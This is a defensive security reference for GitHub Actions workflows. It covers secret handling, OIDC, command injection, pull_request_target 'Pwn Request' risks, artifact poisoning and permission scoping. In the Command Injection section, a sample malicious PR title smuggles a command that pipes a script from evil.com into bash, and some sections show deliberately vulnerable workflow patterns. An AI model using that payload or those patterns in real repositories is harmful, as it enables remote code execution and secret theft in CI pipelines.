# Security Rules Reference — /workflow-expert

## Secret Management Hierarchy

Ranked from least secure to most secure:

| Level | Mechanism           | Credential Lifetime                     | Log Leak Risk               | Recommendation                           |
| ----- | ------------------- | --------------------------------------- | --------------------------- | ---------------------------------------- |
| 0     | Hardcoded in YAML   | Permanent (in Git history)              | Maximum                     | **BANNED** — rotate immediately if found |
| 1     | Repository Secrets  | Long-lived (manual rotation)            | High (mask bypass possible) | Acceptable for non-critical              |
| 2     | Environment Secrets | Long-lived (access restricted by rules) | Medium                      | Good for staging/production separation   |
| 3     | OIDC Federation     | Short-lived (per-job JWT)               | Minimal                     | **REQUIRED** for cloud provider auth     |

### Secret Leak Vectors

- **Log output**: Secrets assigned to intermediate variables that get printed to stdout
- **Structured data bypass**: Large JSON objects can bypass GitHub's built-in masking
- **Shell concatenation**: `run: curl -H "Authorization: Bearer ${{ secrets.TOKEN }}"` — the interpolated value may appear in error messages or `set -x` output

### Mitigation

```yaml
# SAFE — use env block, never interpolate secrets in run: directly
env:
  AUTH_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
run: curl -H "Authorization: Bearer $AUTH_TOKEN" "$API_URL"
```

---

## OIDC Federation Patterns

OIDC eliminates long-lived credentials by exchanging a GitHub-issued JWT for short-lived cloud provider tokens.

### AWS

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@<SHA> # pin to SHA
    with:
      role-to-assume: arn:aws:iam::123456789012:role/github-actions
      aws-region: us-east-1
      # No AWS_ACCESS_KEY_ID or AWS_SECRET_ACCESS_KEY needed
```

### GCP

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - uses: google-github-actions/auth@<SHA>
    with:
      workload_identity_provider: projects/123/locations/global/workloadIdentityPools/github/providers/repo
      service_account: github-actions@project.iam.gserviceaccount.com
```

### Azure

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - uses: azure/login@<SHA>
    with:
      client-id: ${{ secrets.AZURE_CLIENT_ID }}
      tenant-id: ${{ secrets.AZURE_TENANT_ID }}
      subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
      # Federated credential — no client secret needed
```

---

## Command Injection Prevention

### Vulnerable Context Variables

These GitHub context variables are user-controlled and MUST NEVER appear directly in `run:` blocks:

| Variable                           | Attack Vector                  |
| ---------------------------------- | ------------------------------ |
| `github.event.pull_request.title`  | PR author controls content     |
| `github.event.pull_request.body`   | PR author controls content     |
| `github.event.issue.title`         | Issue author controls content  |
| `github.event.issue.body`          | Issue author controls content  |
| `github.event.comment.body`        | Any commenter controls content |
| `github.event.review.body`         | Reviewer controls content      |
| `github.event.head_commit.message` | Committer controls content     |
| `github.head_ref`                  | PR author controls branch name |

### Vulnerable Pattern

```yaml
# CRITICAL — direct interpolation allows command injection
run: |
  echo "Processing PR: ${{ github.event.pull_request.title }}"
  git checkout "${{ github.head_ref }}"
```

An attacker creates a PR with title: `"; curl http://evil.com/steal.sh | bash; echo "`

The shell interprets this as three separate commands.

### Safe Pattern

```yaml
# SAFE — env block treats value as string literal
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
  HEAD_REF: ${{ github.head_ref }}
run: |
  echo "Processing PR: $PR_TITLE"
  git checkout "$HEAD_REF"
```

### Detection

```bash
# Grep for direct interpolation in run blocks
grep -n '\${{.*github\.event\.' .github/workflows/*.yml
grep -n '\${{.*github\.head_ref' .github/workflows/*.yml
```

---

## `pull_request_target` Exploitation (Pwn Request)

### The Attack

`pull_request_target` runs in the context of the **base** repository (not the fork), granting:

- Access to repository secrets
- `GITHUB_TOKEN` with write permissions
- Full trust context

If the workflow checks out the PR head code and executes it:

```yaml
# CRITICAL — Pwn Request vulnerability
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<SHA>
        with:
          ref: ${{ github.event.pull_request.head.sha }} # Attacker's code!
      - run: npm install # Executes attacker's package.json scripts
```

### Safe Patterns

1. **Never checkout PR head** in `pull_request_target` — only checkout base branch
2. **Split into two workflows**: unprivileged `pull_request` for build/test, privileged `workflow_run` for labeling/commenting
3. **If checkout is required**: only read specific files (not execute), validate with allowlist

---

## Artifact Poisoning Prevention

### The Attack Chain

1. Attacker submits PR to fork (unprivileged `pull_request` trigger)
2. Workflow builds artifacts and uploads via `actions/upload-artifact`
3. A separate privileged workflow (triggered by `workflow_run`) downloads and executes the artifact

### Mitigations

- Upload artifacts to isolated paths: `${{ runner.temp }}/artifacts/`
- Verify artifact integrity with SHA-256 hash before execution
- Never execute compiled artifacts from PR workflows in production releases
- Use `actions/download-artifact` with explicit `run-id` to avoid cross-workflow confusion

---

## SHA Pinning Procedure

### Finding the SHA for an Action

```bash
# Get the commit SHA for a specific tag
git ls-remote https://github.com/actions/checkout refs/tags/v4.2.2
# Output: 11bd71901bbe5b1630ceea73d27597364c9af683  refs/tags/v4.2.2
```

### Format

```yaml
# Always include version comment for maintainability
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
uses: actions/setup-node@1d0ff469b7ec7b3cb9d8673fde0c81c44821de2a # v4.2.0
```

### Automation

- Use Dependabot or Renovate to auto-update SHA pins when new versions are released
- Configure: `.github/dependabot.yml` with `package-ecosystem: "github-actions"`

---

## `GITHUB_TOKEN` Scoping

### Default Permissions

Without explicit `permissions:`, `GITHUB_TOKEN` gets **broad default** permissions that vary by trigger.

### Best Practice: Restrictive Default + Per-Job Override

```yaml
# Workflow-level: restrictive default
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    # Inherits workflow-level permissions (read-only) — good

  deploy:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      deployments: write # Only this job gets write access
```

### Common Permission Scopes

| Scope                    | When Needed                   |
| ------------------------ | ----------------------------- |
| `contents: read`         | Checkout code (almost always) |
| `contents: write`        | Push commits, create releases |
| `pull-requests: write`   | Comment on PRs, add labels    |
| `issues: write`          | Create/modify issues          |
| `packages: write`        | Publish to GitHub Packages    |
| `id-token: write`        | OIDC federation               |
| `deployments: write`     | Create deployments            |
| `security-events: write` | Upload SARIF (CodeQL, etc.)   |

---

## Reusable Workflow Secret Passing

### Explicit Passing (Required)

```yaml
# Caller workflow
jobs:
  deploy:
    uses: org/shared-workflows/.github/workflows/deploy.yml@<SHA>
    with:
      environment: production
    secrets:
      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
      AWS_ROLE_ARN: ${{ secrets.AWS_ROLE_ARN }}
```

```yaml
# Called workflow (deploy.yml)
on:
  workflow_call:
    inputs:
      environment:
        required: true
        type: string
    secrets:
      DEPLOY_TOKEN:
        required: true
      AWS_ROLE_ARN:
        required: true
```

### Why Not `secrets: inherit`

- Passes ALL repository secrets to the called workflow — violates least privilege
- Called workflow may be in a different repo with different trust boundaries
- Makes secret auditing impossible — you cannot tell which secrets are actually used
